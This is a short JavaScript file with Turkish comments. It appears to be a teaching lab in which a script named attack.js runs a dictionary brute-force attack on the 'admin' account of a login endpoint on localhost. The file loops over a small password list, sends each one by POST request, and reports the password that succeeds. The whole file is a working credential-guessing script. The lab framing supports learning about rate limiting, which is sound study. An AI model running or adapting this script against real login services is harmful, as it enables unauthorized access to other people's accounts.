// attacker/attack.js büyük projelerde random karakter oluşturan siteler kullanılır ki rare limit konulsa bile uzun uğraşlar sonucunda bulunamasın

import axios from 'axios'; //Axios, hem tarayıcıda (front-end) hem de Node.js'te (back-end) çalışan, HTTP istekleri yapmak için kullanılan bir kütüphanedir.server klasörü bizim back-end'imiz, attacker script'i ise (ve Postman) bizim "istemcimiz" (client) rolünü üstlendi.

// Hedef sunucumuzun adresi
const targetUrl = 'http://localhost:4000/login';
const usernameToAttack = 'admin';

// Deneyeceğimiz şifrelerin listesi (sözlük - dictionary)
// Gerçek bir saldırıda bu liste milyonlarca olabilir.
const passwordList = [
  '0000',
  '1111',
  'admin',
  'password',
  '12345',
  'qwerty',
  '1234', // <-- Doğru şifreyi listeye ekledik ki bulabilelim
  '5555',
];

// Saldırıyı başlatacak olan ana fonksiyon
async function bruteForceAttack() {
  console.log('Brute force saldırısı başlatılıyor...');
  console.log(`Hedef: ${targetUrl}`);
  console.log('------------------------------------');

  // Şifre listesindeki her bir şifreyi döngüye al
  for (const password of passwordList) {
    try {
      console.log(`Denenen şifre: ${password}`);
      
      // Hedef sunucuya POST isteği gönder
      const response = await axios.post(targetUrl, {
        username: usernameToAttack,
        password: password,
      });

      // Sunucudan gelen cevabı kontrol et
      if (response.status === 200) {
        console.log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        console.log(`!!! ŞİFRE BULUNDU: ${password} !!!`);
        console.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        return; // Şifre bulununca programı sonlandır
      }

    } catch (error) {
      // Sunucu 401 (Hatalı Şifre) gibi bir hata döndürdüğünde bu kısım çalışır.
      // Bu beklenen bir durum olduğu için bir şey yapmamıza gerek yok, denemeye devam.
      if (error.response && error.response.status !== 200) {
        // Hatalı deneme, devam...
      } else {
        // Sunucuya ulaşılamıyor gibi başka bir hata varsa göster
        console.error('\nSunucuya bağlanırken bir hata oluştu:', error.message);
        return;
      }
    }
  }

  console.log('\nSaldırı tamamlandı. Şifre listede bulunamadı.');
}

// Saldırıyı başlat
bruteForceAttack();